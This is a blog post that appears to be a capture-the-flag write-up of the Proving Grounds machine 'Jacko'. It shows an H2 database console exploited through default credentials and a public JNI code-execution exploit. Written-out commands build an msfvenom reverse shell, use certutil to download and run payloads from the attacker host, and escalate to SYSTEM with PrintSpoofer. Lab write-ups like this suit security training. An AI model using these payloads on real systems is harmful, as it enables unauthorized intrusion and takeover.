<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Jacko - OSPG | Infomation Security - Blog</title><meta name="description" content="Summary Of ResultAs enumerating, we discover a vulnerable H2 database with a default credentials running on the target system, which leads to Remote Code Exe...
    "><meta http-equiv="cache-control" content="max-age=29030400"><meta http-equiv="pragma" content="public"><meta name="keywords" content=""><meta name="author" content="Jay Nguyen"><meta http-equiv="Content-Language" content="en"><meta property="og:locale" content="en"><meta property="og:site_name" content="Infomation Security"><meta property="og:type" content="WebSite"><meta property="og:url" content="https://jayngng.github.io/blog/jacko-ospg/"><meta property="og:description" content="
    Blog"><meta property="og:title" content="Jacko - OSPG
  "><link rel="canonical" href="https://jayngng.github.io/blog/jacko-ospg/"><link type="application/atom+xml" rel="alternate" title="Infomation Security" href="https://jayngng.github.io/feed.xml"><link rel="icon" type="image/png" sizes="32x32" href="https://jayngng.github.io/assets/images/favicon/favicon-32x32.png"><link href="https://fonts.googleapis.com/css?family=Special+Elite" rel="stylesheet"><script defer="defer" src="https://use.fontawesome.com/releases/v5.0.6/js/all.js"></script><link rel="stylesheet" href="https://jayngng.github.io/assets/css/bootstrap.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/jektify.css"><link rel="stylesheet" href="https://jayngng.github.io/assets/css/whiteglass.css"></head><body class="body underline_links" id="top"><div class="container layout_default"><div class="row"><div class="col-lg-3 px-0 mt-0 sidebar"><div class="py-3 sticky-top flex-grow-1"><div class="pt-3 sidebar__wrapper"><div class="nav flex-lg-column mx-3 mx-lg-0"><div class="d-none d-sm-block sidebar__avatar_flip"><div class="sidebar__avatar_flip-card"><a class="sidebar__avatar_flip-front sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/author.jpg" alt="Avatar"> </a><a class="sidebar__avatar_flip-back sidebar__avatar_flip-face" href="https://jayngng.github.io/"><img class="p-1 img-fluid mx-auto d-block animation__pulse sidebar_avatar_circle sidebar_avatar_background sidebar_avatar_border image_avatar" src="/assets/images/avatar/athor_m.png" alt="Avatar"></a></div></div><h1 class="p-2 text-center d-md-flex align-items-center mx-auto animation__sidebar-title sidebar__title"><a href="https://jayngng.github.io/" class="nav-link" style="font-size: 2.3rem">whoami</a></h1><div class="p-2 mx-3 d-md-flex flex-md-column align-items-md-start align-items-center align-items-lg-start flex-lg-column mx-auto mr-lg-3 ml-lg-3 sidebar__menu animation__sidebar-menu"><div class="my-1 d-none d-md-block mr-3 sidebar__menu-title">Menu: Blog</div><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-edit"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/">Blog</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-tags"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/tags/">Tags</a></li><li class="mr-3 mr-lg-0 float-left float-lg-none sidebar__menu-item"><i class="mr-1 fas fa-search"></i> <a class="sidebar__menu-link" href="https://jayngng.github.io/blog/search/">Search</a></li></div></div></div></div></div><div class="col-lg-9 p-0 py-4 content" id="main"><div class="px-3 mt-lg-0 layout_post animation__content" itemscope itemtype="http://schema.org/BlogPosting"><div class="p-0 p-lg-3 mb-4 layout_post__header"><h1 class="font-weight-bold layout_post__title">Jacko - OSPG</h1><div class="layout_post__date"><time class="layout_post__time"><i class="far fa-calendar-alt"></i> August 17, 2021</time></div><div class="layout_post__tags"><i class="fa fa-tags"></i>&nbsp;Tags:&nbsp; | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//ctf">ctf</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//pg">pg</a> | <a class="layout_post__tags-link" href="https://jayngng.github.io/blog/tags//windows">windows</a> |</div><div class="layout_post__reading_time"><i class="far fa-clock"></i> Read this in "about 6 minutes".</div></div><div class="p-0 p-lg-3 mb-4 layout_post__content"><div class="d-block"><div class="py-3 row"><div class="offset-6 col-6 offset-sm-9 col-sm-3 offset-lg-10 col-lg-2"></div></div><h1 id="summary-of-result"><strong>Summary Of Result</strong></h1><p>As enumerating, we discover a vulnerable <code class="language-plaintext highlighter-rouge">H2 database</code> with a default credentials running on the target system, which leads to Remote Code Execution. We can then escalate our privilege by abusing misconfigured <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> token.</p><hr><h1 id="attack-narrative"><strong>Attack Narrative</strong></h1><p>The attack is summed up within three stages:</p><ul><li>Enumeration.</li><li>Exploitation.</li><li>Administrative Privilege Escalation.</li></ul><h1 id="enumeration"><strong>Enumeration</strong></h1><p>We will start with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:                                                                                
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0      
|_http-title: H2 Database Engine <span class="o">(</span>redirect<span class="o">)</span>
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
7680/tcp open  tcpwrapped    syn-ack ttl 127
8082/tcp open  http          syn-ack ttl 127 H2 database http console
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
| http-methods:             
|_  Supported Methods: GET POST
|_http-title: H2 Console  
</code></pre></div></div><ul><li>There are a few ports running on the target machine. However, the HTTP service on port 8082 really draws our attention.</li></ul><h4 id="h2-database---port-8082"><strong>H2 Database</strong> <strong>- Port 8082</strong></h4><p>Navigate to the website, we are redirected to a login page.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.60.66:8082/login.jsp?jsessionid<span class="o">=</span>67d97f9e84ff28caa571dba2a900edb3 | html2text                                                                                   1 ⚙


<span class="o">[</span>One of: Čeština/Deutsch/English/Español/Français/Magyar/한국어/Indonesia/
Italiano/日本語/Nederlands/Polski/Português <span class="o">(</span>Brasil<span class="o">)</span>/Português <span class="o">(</span>Europeu<span class="o">)</span>/русский/
Slovensky/Türkçe/Українська/中文 <span class="o">(</span>简体<span class="o">)</span>/中文 <span class="o">(</span>繁體<span class="o">)]</span>    Preferences     Tools    Help
Login
                <span class="o">[</span>One of: Generic H2 <span class="o">(</span>Embedded<span class="o">)</span>/Generic H2 <span class="o">(</span>Server<span class="o">)</span>/Generic
                Derby <span class="o">(</span>Embedded<span class="o">)</span>/Generic Derby <span class="o">(</span>Server<span class="o">)</span>/Generic HSQLDB/Generic
                MySQL/Generic PostgreSQL/Generic MS SQL Server 2005/Generic MS
Saved Settings: SQL Server 2000/Generic Oracle/Generic DB2/Generic SQLite/
                Generic Firebird Server/Generic Azure SQL/Generic Hive/Generic
                Hive 2/Generic Impala/Generic Redshift/Generic Snowflake/
                Generic Teradata/Generic JNDI Data Source]
Setting Name:   <span class="o">[</span>Generic H2 <span class="o">(</span>Embedded<span class="o">)]</span> <span class="o">[</span>Unknown INPUT <span class="nb">type</span><span class="o">]</span> <span class="o">[</span>Unknown INPUT
                <span class="nb">type</span><span class="o">]</span>
<span class="o">==============================================================================</span>
Driver Class:   <span class="o">[</span>org.h2.Driver       <span class="o">]</span>
JDBC_URL:       <span class="o">[</span>jdbc:h2:~/test      <span class="o">]</span>
User Name:      <span class="o">[</span>sa                  <span class="o">]</span>
Password:       <span class="o">[</span><span class="k">********************</span><span class="o">]</span>
                <span class="o">[</span>Connect]   <span class="o">[</span>Unknown INPUT <span class="nb">type</span><span class="o">]</span>

</code></pre></div></div><p>Testing some weak credentials: <code class="language-plaintext highlighter-rouge">admin:admin</code>, <code class="language-plaintext highlighter-rouge">admin:password</code>, <code class="language-plaintext highlighter-rouge">root:root</code>, or <code class="language-plaintext highlighter-rouge">root:toor</code>, but none of them really works out.</p><p>After a few researches, we discover that the web application using default credentials <code class="language-plaintext highlighter-rouge">sar:(no password)</code>, which allows us to completely bypass the login portal, and logged in as web <code class="language-plaintext highlighter-rouge">administrator</code>.</p><div class="row imager__plugin"><img class="img-fluid mx-auto d-block" src="/assets/images/posts/jacko/version.png" title="jacko/version.png" alt="jacko/version.png"></div><p>More importantly, we also notice that the <code class="language-plaintext highlighter-rouge">H2 database</code> version is <code class="language-plaintext highlighter-rouge">1.4.199</code>, which expose a critical vulnerability that ends up Remote Code Execution.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit H2 1.4.199
<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                                                                                   |  Path
<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
H2 Database 1.4.199 - JNI Code Execution                                                                                                                                         | java/local/49384.txt
<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
</code></pre></div></div><hr><h1 id="exploitation"><strong>Exploitation</strong></h1><h4 id="h2-database-exploitation"><strong>H2 Database Exploitation</strong></h4><ol><li>Following along the <a href="https://www.exploit-db.com/exploits/49384">public exploit</a>, we first use SQL syntax to create a DLL payload.<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT CSVWRITE('C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\J</span>NIScriptEngine.dll', CONCAT('SELECT NULL "'
[...]
'ISO-8859-1', '', '', '', '', '');
</code></pre></div></div></li><li>Next, we will load the DLL payload.<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\J</span>NIScriptEngine.dll');
</code></pre></div></div></li><li>Then, we craft a reverse shell using <code class="language-plaintext highlighter-rouge">msfvenom</code>.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.49.60 <span class="nv">LPORT</span><span class="o">=</span>80 <span class="nt">-f</span> exe <span class="nt">-o</span> WebIIS.exe                                                                                     130 ⨯ 1 ⚙
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: WebIIS.exe
</code></pre></div></div></li><li>We host a web server to transfer our payload, and also set up a <code class="language-plaintext highlighter-rouge">nc</code> listener to catch the reverse shell.<ul><li>On the first terminal, execute the following command to host a web server on port 8082.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8082
</code></pre></div></div></li><li>On the second terminal, we kickoff a <code class="language-plaintext highlighter-rouge">nc</code> listener on port 80.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 80
</code></pre></div></div></li></ul></li><li>Finally, we run the following payload to achieve command execution.<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -f -urlcache -split <span class="se">\"</span>http://192.168.49.60:8082/WebIIS.exe<span class="se">\"</span> <span class="se">\"</span>C:<span class="se">\\</span>Windows<span class="se">\\</span>Temp<span class="se">\\</span>WebIIS.exe<span class="se">\"</span>").getInputStream()).useDelimiter("<span class="se">\\</span>Z").next()');CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:<span class="se">\\</span>Windows<span class="se">\\</span>Temp<span class="se">\\</span>WebIIS.exe").getInputStream()).useDelimiter("<span class="se">\\</span>Z").next()');
</code></pre></div></div></li></ol><p>If everything works properly, the reverse connection should be established at port 80 as <code class="language-plaintext highlighter-rouge">tony</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 80  
listening on <span class="o">[</span>any] 80 ...
connect to <span class="o">[</span>192.168.49.234] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.234.66] 49770
Microsoft Windows <span class="o">[</span>Version 10.0.18363.836]
<span class="o">(</span>c<span class="o">)</span> 2019 Microsoft Corporation. All rights reserved.

C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\H</span>2<span class="se">\s</span>ervice&gt;set <span class="nv">PATH</span><span class="o">=</span>%SystemRoot%<span class="se">\s</span>ystem32<span class="p">;</span>%SystemRoot%<span class="p">;</span>
<span class="nb">set </span><span class="nv">PATH</span><span class="o">=</span>%SystemRoot%<span class="se">\s</span>ystem32<span class="p">;</span>%SystemRoot%<span class="p">;</span>

C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\H</span>2<span class="se">\s</span>ervice&gt;whoami
<span class="nb">whoami
</span>jacko<span class="se">\t</span>ony
</code></pre></div></div><hr><h1 id="administrative-privilege-escalation"><strong>Administrative Privilege Escalation</strong></h1><p>A misconfigured privilege token is set for <code class="language-plaintext highlighter-rouge">tony</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\H</span>2<span class="se">\s</span>ervice&gt;whoami /priv
<span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State   
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
...
</code></pre></div></div><p>We can abuse it to escalate our privilege with the support of <a href="https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0"><code class="language-plaintext highlighter-rouge">PrintSpoofer</code></a>.</p><p>All we have to do is finding a way to transfer <code class="language-plaintext highlighter-rouge">PrintSpoofer</code> to the target system. This can be done with <code class="language-plaintext highlighter-rouge">certutil</code> utility.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\H</span>2<span class="se">\s</span>ervice&gt;certutil <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> <span class="s2">"http://192.168.49.234:8082/PrintSpoofer64.exe"</span> <span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Temp</span><span class="se">\\</span><span class="s2">PrintSpoofer64.exe"</span>
<span class="p">;</span>certutil <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> <span class="s2">"http://192.168.49.234:8082/PrintSpoofer64.exe"</span> <span class="s2">"C:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">Temp</span><span class="se">\\</span><span class="s2">PrintSpoofer64.exe"</span>
<span class="k">****</span>  Online  <span class="k">****</span>
  0000  ...
  6a00
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
</code></pre></div></div><p>As the file is successfully transfered, we execute the following command …</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\P</span>rogram Files <span class="o">(</span>x86<span class="o">)</span><span class="se">\H</span>2<span class="se">\s</span>ervice&gt;C:<span class="se">\\</span>Windows<span class="se">\\</span>Temp<span class="se">\\</span>PrintSpoofer64.exe <span class="nt">-i</span> <span class="nt">-c</span> cmd
C:<span class="se">\\</span>Windows<span class="se">\\</span>Temp<span class="se">\\</span>PrintSpoofer64.exe <span class="nt">-i</span> <span class="nt">-c</span> cmd
<span class="o">[</span>+] Found privilege: SeImpersonatePrivilege
<span class="o">[</span>+] Named pipe listening...
<span class="o">[</span>+] CreateProcessAsUser<span class="o">()</span> OK
Microsoft Windows <span class="o">[</span>Version 10.0.18363.836]
<span class="o">(</span>c<span class="o">)</span> 2019 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem
</code></pre></div></div><p>and become <code class="language-plaintext highlighter-rouge">Administrator</code>.</p><center><script src="https://tryhackme.com/badge/44696"></script></center></div></div><div class="p-0 p-lg-3 mb-4 layout_post__footer"></div></div></div></div></div><div class="py-1 position-fixed fixed-bottom w-100 footer"><div class="container-fluid"><div class="row"><div class="text-center col-12 col-md-4"><span class="footer__copyright">Infomation Security © 2021-2022 • All right reserved.</span></div><div class="text-center col-12 col-md-4 d-none d-md-block"><span class="footer__message">Simplicity is fashionable.</span></div><div class="text-center col-12 col-md-4"><span class="footer__madeby">Made with&nbsp;<a href="https://jekyllrb.com" target="_blank">Jekyll</a>&nbsp;using&nbsp;<a href="https://github.com/williamcanin/typing-jekyll-template" target="_blank">Typing</a>&nbsp;Theme.</span></div></div></div></div><div class="d-block d-lg-none position-fixed fixed-bottom w-100 scrolltop"><div class="float-right mr-3 scrolltop__wrapper"><a class="mr-3 scrolltop__button" href="#top"><i class="fas fa-caret-up"></i></a></div></div><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/jquery.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/popper.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/bootstrap.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/vendor/js/simple-jekyll-search.min.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/global.js"></script><script type="text/javascript" src="https://jayngng.github.io/assets/js/post.js"></script><script src="https://jayngng.github.io/assets/vendor/jektify/js/jektify.min.js"></script></body><script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script></html>